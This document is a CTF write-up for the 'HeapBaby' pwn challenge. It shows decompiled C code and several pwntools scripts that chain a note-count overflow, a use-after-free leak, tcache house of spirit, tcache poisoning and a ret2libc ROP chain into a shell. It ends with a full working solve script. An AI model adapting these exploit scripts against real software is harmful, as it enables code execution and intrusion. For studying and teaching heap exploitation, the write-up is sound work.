# HeapBaby

## Description

I honestly didn't copy the description and they always don't open the challenges after the CTF, so that's that.

I solved this challenge after the CTF ended, so it isn't tested on the remote server.

{% hint style="info" %}
Hint: House of Spirit
{% endhint %}

{% file src="../../.gitbook/assets/challenge" %}

{% file src="../../.gitbook/assets/libc.so (1).6" %}

## Solution

### TL;DR

* Create the 11th note to overflow the **note\_list** global variable into **note\_cnt**
* Perform **tcache house of spirit** attack by creating a fake chunk on heap
* Delete notes to decrement ptr stored in **note\_cnt**. Decrement ptr till it points to the fake chunk
* Read index 12 (gift) to get stack leak, use stack leak to find username buffer (or any buffer in main)
* Get libc leak by freeing 8 chunks (**UAF**)
* Free any index < 11, the free index 11 (note\_cnt) to free the fake chunk, then free index where you wrote the fake chunk
* Perform **tcache poisoning** with the freed fake chunk (need get key for ptr since glibc 2.35 is used). Overwrite fwd pointer of freed fake chunk with address of username buffer
* Now perform BOF in username buffer, then perform simple ROP
* Win

### Initial Analysis

Decompiling the binary with ghidra, there are 3 main functions of the binary: **create note**, **print note**, **delete note**.

{% tabs %}
{% tab title="main" %}
```c
int main(undefined4 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 local_50;
  undefined8 local_48;
  undefined4 local_3c;
  undefined8 username;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  uint option;
  uint i;
  
  local_50 = param_3;
  local_48 = param_2;
  local_3c = param_1;
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  username = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("[>] Input your name : ");
  read(0,&username,0x1f);
  gift = &local_50;
  printf("[*] ");
  for (i = 0; (i < 0x20 && (*(char *)((long)&username + (long)(int)i) != '\n')); i = i + 1) {
    putchar((int)*(char *)((long)&username + (long)(int)i));
  }
  puts("\'s NOTEPAD");
LAB_0040163c:
  manual();
  __isoc99_scanf("%d",&option);
  if (option == 4) {
    puts("[*] Bye bye~~!!");
    return 0;
  }
  if (option < 5) {
    if (option == 3) {
      delete();
      goto LAB_0040163c;
    }
    if (option < 4) {
      if (option == 1) {
        add();
      }
      else {
        if (option != 2) goto LAB_004016be;
        print_note();
      }
      goto LAB_0040163c;
    }
  }
LAB_004016be:
  puts("[*] Invalid value");
  goto LAB_0040163c;
}
```
{% endtab %}

{% tab title="manual" %}
```c
void manual(void)

{
  puts("[*] 1. Add note");
  puts("[*] 2. Print note");
  puts("[*] 3. Delete note");
  puts("[*] 4. Exit");
  printf("[>] ");
  return;
}
```
{% endtab %}

{% tab title="delete" %}
```c
void delete(void)

{
  ulong index;
  
  printf("[>] Select delete note index : ");
  __isoc99_scanf("%lld",&index);
  if ((index == 0) || (note_cnt < index)) {
    puts("[*] Invalid value");
  }
  else {
    free(*(void **)(note_list + index * 8));
    note_cnt = note_cnt - 1;
    if (index < 11) {
      *(undefined8 *)(note_list + index * 8) = 0;
    }
    printf("[*] %lld index note deleted.\n",index);
  }
  return;
}
```
{% endtab %}

{% tab title="add" %}
```c
void add(void)

{
  uint size;
  void *memo_inp;
  int i;
  
  printf("[>] Input Size : ");
  __isoc99_scanf("%d",&size);
  if (size < 256) {
    puts("[*] Size is too small.");
  }
  else {
    printf("[*] Size is %d\n",(ulong)size);
    memo_inp = malloc((ulong)size);
    printf("[>] Input memo : ");
    read(0,memo_inp,(ulong)(size - 1));
    if (note_cnt < 11) {
      *(void **)(note_list + note_cnt * 8) = memo_inp;
      note_cnt = note_cnt + 1;
    }
    else {
      for (i = 0; (ulong)(long)i <= note_cnt; i = i + 1) {
        if (*(long *)(note_list + (long)i * 8) == 0) {
          *(void **)(note_list + (long)i * 8) = memo_inp;
          note_cnt = note_cnt + 1;
          break;
        }
      }
    }
    puts("[*] Note added.");
  }
  return;
}
```
{% endtab %}

{% tab title="print_note" %}
```c
void print_note(void)

{
  ulong note_index;
  
  printf("[>] Input note index : ");
  __isoc99_scanf("%lld",&note_index);
  if ((note_index == 0) || (note_cnt < note_index)) {
    puts("[*] Invalid value\n");
  }
  else {
    puts(*(char **)(note_list + (note_index - 1) * 8));
  }
  return;
}
```
{% endtab %}
{% endtabs %}

Looking at **note\_list** in gdb, we can see it can store 10 address. The 11th address will be stored in **note\_cnt**.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>viewing note_list</p></figcaption></figure>

We also see that **gift** is right after **note\_cnt**.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption><p>viewing gift</p></figcaption></figure>

If we create 11 notes, we can see that **note\_cnt** indeed got overwritten with a malloced ptr.

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption><p>overwritten note_cnt</p></figcaption></figure>

### Stack Leak

Since the **note\_cnt** is very high (because it is an address), we can now read index 12, which contains our **gift**. This allows for a **stack leak** and we can calculate the address of **username**.

### Libc Leak

Looking at the **delete** function, we note that notes stored in **index >= 11** will have a **Use After Free** (UAF) vulnerability, so we can leak the **fwd** of a chunk that is freed into **unsorted bin**, which would give us a libc leak.

{% tabs %}
{% tab title="delete" %}
```c
void delete(void)

{
  ulong index;
  
  printf("[>] Select delete note index : ");
  __isoc99_scanf("%lld",&index);
  if ((index == 0) || (note_cnt < index)) {
    puts("[*] Invalid value");
  }
  else {
    free(*(void **)(note_list + index * 8));
    note_cnt = note_cnt - 1;
    if (index < 11) {
      *(undefined8 *)(note_list + index * 8) = 0;
    }
    printf("[*] %lld index note deleted.\n",index);
  }
  return;
}
```
{% endtab %}
{% endtabs %}

To free a chunk into **unsorted bin**, we can allocate **8** chunks of the **same size**, then free all **8** chunks. The first **7** chunks that are freed should go into **tcache bin**, while the last would go into **unsorted bin** :)

<details>

<summary>leaking libc code</summary>

```python
#!/usr/bin/env python3

from pwn import *

def option(m):
    p.sendlineafter(b'[>] ',str(m).encode())

def add(size,m):
    option(1)
    p.sendlineafter(b'Input Size : ',str(size).encode())
    p.sendafter(b'Input memo : ',m)

def print_note(index):
    option(2)
    p.sendlineafter(b'Input note index : ',str(index).encode())
    return p.recvuntil(b'\n[*]',drop=True)

def delete_note(index):
    option(3)
    p.sendlineafter(b'Select delete note index : ',str(index).encode())

elf = context.binary = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
# url,port = "34.141.229.188",1337

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process()

if args.GDB:
    gdb.attach(p)

name = b'AAAA'
p.sendlineafter(b'Input your name : ',name)

for _ in range(9):
    add(300,b'BBBB')

add(300,b'DDDD')

add(300,b'CCCC')

add(300,b'CCCC')

for _ in range(8):
    add(500,b'NNNN')
for _ in range(21,21-8,-1):
    delete_note(_)

libc_leak = u64(print_note(14).ljust(8,b'\x00'))

print(hex(libc_leak))
p.interactive()
```

</details>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption><p>libc address leaked</p></figcaption></figure>

### House of Spirit Attack

Now we most importantly need an arbitrary write. To do this, we can utilize **Tcache House of Spirit** since there is no heap overflow or anything else we can leverage on.

{% hint style="info" %}
Tcache House of Spirit attack: "Frees a fake chunk to get malloc to return a nearly-arbitrary pointer."\
[https://github.com/shellphish/how2heap/blob/master/glibc\_2.35/tcache\_house\_of\_spirit.c](https://github.com/shellphish/how2heap/blob/master/glibc\_2.35/tcache\_house\_of\_spirit.c)
{% endhint %}

So we can create a fake chunk on the heap. I created a fake chunk in index 10, with size of `0x140` containing `DDDD`.

<details>

<summary>create fake chunk code</summary>

```python
#!/usr/bin/env python3

from pwn import *

def option(m):
    p.sendlineafter(b'[>] ',str(m).encode())

def add(size,m):
    option(1)
    p.sendlineafter(b'Input Size : ',str(size).encode())
    p.sendafter(b'Input memo : ',m)

def print_note(index):
    option(2)
    p.sendlineafter(b'Input note index : ',str(index).encode())
    return p.recvuntil(b'\n[*]',drop=True)

def delete_note(index):
    option(3)
    p.sendlineafter(b'Select delete note index : ',str(index).encode())

elf = context.binary = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
# url,port = "34.141.229.188",1337

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process()

if args.GDB:
    gdb.attach(p)

name = b'AAAA'
p.sendlineafter(b'Input your name : ',name)

for _ in range(9):
    add(300,b'BBBB')

payload = b'\x00'*8*7
payload += p64(0x141) # creates fake chunk
payload += b'DDDDDDDD'

add(300,payload) # index 10
add(300,b'CCCC')
add(300,b'CCCC')

# create and free 8 chunks
for _ in range(8):
    add(500,b'NNNN')
for _ in range(21,21-8,-1): 
    delete_note(_)

# get unsorted bin fwd ptr
stack_leak = u64(print_note(12).ljust(8,b'\x00'))
print(hex(stack_leak))
```

</details>

We can see our fake chunk in the note of index 10:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>fake chunk creation</p></figcaption></figure>

Now that we have a fake chunk, we need to free it. Notice how **note\_cnt** is always incrementing and decrementing whenever a note is created and deleted? We can utilize the pointer at the location by calling the **delete** function with a note index that contains **0** as an address, so it does **free(0)** which does nothing, but it also decrements our pointer at **note\_cnt** by **1**.

{% hint style="info" %}
The `free` function causes the space pointed to by `ptr` to be deallocated, that is, made available for further allocation. If `ptr` is a null pointer, no action occurs.\
[https://pubs.opengroup.org/onlinepubs/7908799/xsh/free.html](https://pubs.opengroup.org/onlinepubs/7908799/xsh/free.html)
{% endhint %}

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption><p>manipulating note_cnt ptr</p></figcaption></figure>

We can free the fake chunk now, but we first need to free another chunk so that our freed fake chunk's **fwd ptr** points to another freed chunk. This **fwd ptr** is the one we will be overwriting to point to any address to get arbitrary write.

We will also need to leak this **fwd ptr** to get the obfuscation key needed for our own **ptr** to work.

<details>

<summary>free fake chunk code</summary>

```python
#!/usr/bin/env python3

from pwn import *

def option(m):
    p.sendlineafter(b'[>] ',str(m).encode())

def add(size,m):
    option(1)
    p.sendlineafter(b'Input Size : ',str(size).encode())
    p.sendafter(b'Input memo : ',m)

def print_note(index):
    option(2)
    p.sendlineafter(b'Input note index : ',str(index).encode())
    return p.recvuntil(b'\n[*]',drop=True)

def delete_note(index):
    option(3)
    p.sendlineafter(b'Select delete note index : ',str(index).encode())

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

elf = context.binary = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
# url,port = "34.141.229.188",1337

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process()

if args.GDB:
    gdb.attach(p)

name = b'AAAA'
p.sendlineafter(b'Input your name : ',name)

for _ in range(9):
    add(300,b'BBBB')

payload = b'\x00'*8*7
payload += p64(0x141) # creates fake chunk
payload += b'DDDDDDDD'

add(300,payload) # index 10
add(300,b'CCCC')
add(300,b'CCCC')

# create and free 8 chunks
for _ in range(8):
    add(500,b'NNNN')
for _ in range(21,21-8,-1): 
    delete_note(_)

# get unsorted bin fwd ptr
stack_leak = u64(print_note(12).ljust(8,b'\x00'))
print("Stack leak:",hex(stack_leak))
username_ptr = stack_leak - 336 - 8

# decrement ptr at note_cnt to point to our fake chunk
for _ in range(300+0x16-(8*8)):
    delete_note(30)

p.interactive()

delete_note(1)
add(800,b'HHHH') # makes sure note_cnt is correct
delete_note(11) # frees fake chunk
add(800,b'HHHH') # makes sure note_cnt is correct
ptr = u64(print_note(11).ljust(8,b'\x00'))
delete_note(10) # frees chunk containing our fake chunk to overwrite freed fake chunk ptr

libc_leak = u64(print_note(14).ljust(8,b'\x00'))
libc_offset = 0x7f9d4d619ed0-0x7f9d4d400000
libc.address = libc_leak - libc_offset
print("Libc leak:",hex(libc_leak))

# needed for glibc 2.35 heap ptrs
original_ptr = deobfuscate(ptr)
key = original_ptr ^ ptr
```

</details>

{% hint style="info" %}
The deobfuscate function for deobfuscating the **fwd ptr** is referred from [https://ctftime.org/writeup/34804](https://ctftime.org/writeup/34804)
{% endhint %}

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>freed fake chunk with fwd ptr</p></figcaption></figure>

Now we can create a note with size of 300 bytes, then overwrite the **fwd ptr** of the fake chunk with our own. Remember that the **ptr** needs to be obfuscated, so we need to **xor** the key with the address we want to write to, then overwrite the **fwd ptr** with this obfuscated address (basically **tcache poisoning**).

Afterwards, we create a note of size 300 bytes to clear the first tcache ptr, then the next note of size 300 bytes we create will write to our address!

We can try to write a bunch of `Z`'s to **note\_list** to check if it works.

<details>

<summary>arbitrary write to note_list example code</summary>

```python
#!/usr/bin/env python3

from pwn import *

def option(m):
    p.sendlineafter(b'[>] ',str(m).encode())

def add(size,m):
    option(1)
    p.sendlineafter(b'Input Size : ',str(size).encode())
    p.sendafter(b'Input memo : ',m)

def print_note(index):
    option(2)
    p.sendlineafter(b'Input note index : ',str(index).encode())
    return p.recvuntil(b'\n[*]',drop=True)

def delete_note(index):
    option(3)
    p.sendlineafter(b'Select delete note index : ',str(index).encode())

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

elf = context.binary = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
# url,port = "34.141.229.188",1337

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process()

if args.GDB:
    gdb.attach(p)

name = b'AAAA'
p.sendlineafter(b'Input your name : ',name)

for _ in range(9):
    add(300,b'BBBB')

payload = b'\x00'*8*7
payload += p64(0x141) # creates fake chunk
payload += b'DDDDDDDD'

add(300,payload) # index 10
add(300,b'CCCC')
add(300,b'CCCC')

# create and free 8 chunks
for _ in range(8):
    add(500,b'NNNN')
for _ in range(21,21-8,-1): 
    delete_note(_)

# get unsorted bin fwd ptr
stack_leak = u64(print_note(12).ljust(8,b'\x00'))
print("Stack leak:",hex(stack_leak))
username_ptr = stack_leak - 336 - 8

# decrement ptr at note_cnt to point to our fake chunk
for _ in range(300+0x16-(8*8)):
    delete_note(30)

delete_note(1)
add(800,b'HHHH') # makes sure note_cnt is correct
delete_note(11) # frees fake chunk
add(800,b'HHHH') # makes sure note_cnt is correct
ptr = u64(print_note(11).ljust(8,b'\x00'))
delete_note(10) # frees chunk containing our fake chunk to overwrite freed fake chunk ptr

libc_leak = u64(print_note(14).ljust(8,b'\x00'))
libc_offset = 0x7f9d4d619ed0-0x7f9d4d400000
libc.address = libc_leak - libc_offset
print("Libc leak:",hex(libc_leak))

# needed for glibc 2.35 heap ptrs
original_ptr = deobfuscate(ptr)
key = original_ptr ^ ptr
note_list = 0x404040

# arbitrary write
payload = b'E'*32 + p64(0)*3 +p64(0x141) + p64(key^note_list)

add(300,payload)
add(300,b'AAAA')
add(300,b'ZZZZZZZZ')
p.interactive()
```

</details>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>overwritten note_list</p></figcaption></figure>

One easy way to get RCE is to point our address to the **username** buffer and **overflow** it, then we can perform a simple **ret2libc** through **ROP**.

### Solve Script

<details>

<summary>solve.py</summary>

```python
#!/usr/bin/env python3

from pwn import *

def option(m):
    p.sendlineafter(b'[>] ',str(m).encode())

def add(size,m):
    option(1)
    p.sendlineafter(b'Input Size : ',str(size).encode())
    p.sendafter(b'Input memo : ',m)

def print_note(index):
    option(2)
    p.sendlineafter(b'Input note index : ',str(index).encode())
    return p.recvuntil(b'\n[*]',drop=True)

def delete_note(index):
    option(3)
    p.sendlineafter(b'Select delete note index : ',str(index).encode())

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

elf = context.binary = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
# url,port = "34.141.229.188",1337

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process()

if args.GDB:
    gdb.attach(p)

name = b'AAAA'
p.sendlineafter(b'Input your name : ',name)

for _ in range(9):
    add(300,b'BBBB')

payload = b'\x00'*8*7
payload += p64(0x141)
payload += b'DDDDDDDD'

add(300,payload)

add(300,b'CCCC')

add(300,b'CCCC')

for _ in range(8):
    add(500,b'NNNN')
for _ in range(21,21-8,-1):
    delete_note(_)

for _ in range(300+0x16-(8*8)):
    delete_note(30)

stack_leak = u64(print_note(12).ljust(8,b'\x00'))
print(hex(stack_leak))

delete_note(1)
add(800,b'HHHH')
delete_note(11)

add(800,b'HHHH')
ptr = u64(print_note(11).ljust(8,b'\x00'))
delete_note(10)

libc_leak = u64(print_note(14).ljust(8,b'\x00'))
libc_offset = 0x7f9d4d619ed0-0x7f9d4d400000
libc.address = libc_leak - libc_offset
print(hex(libc_leak))

original_ptr = deobfuscate(ptr)
key = original_ptr ^ ptr

username_ptr = stack_leak - 336 - 8

# arbitrary write
payload = b'E'*32 + p64(0)*3 +p64(0x141) + p64(key^username_ptr)

add(300,payload)
add(300,b'AAAA')

one_gadget = libc.address + 0xebcf8
pop_rdx_r12 = libc.address + 0x000000000011f497
pop_rsi = libc.address + 0x000000000002be51
pop_rdi = libc.address + 0x000000000002a3e5

payload = b'A'*48
payload += b'B' * 8 #rbp
payload += p64(pop_rdx_r12) + p64(0) + p64(0)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym['execve'])

add(300,payload)

option(4)

p.interactive()
p.close()

# tcache house of spirit
```

</details>
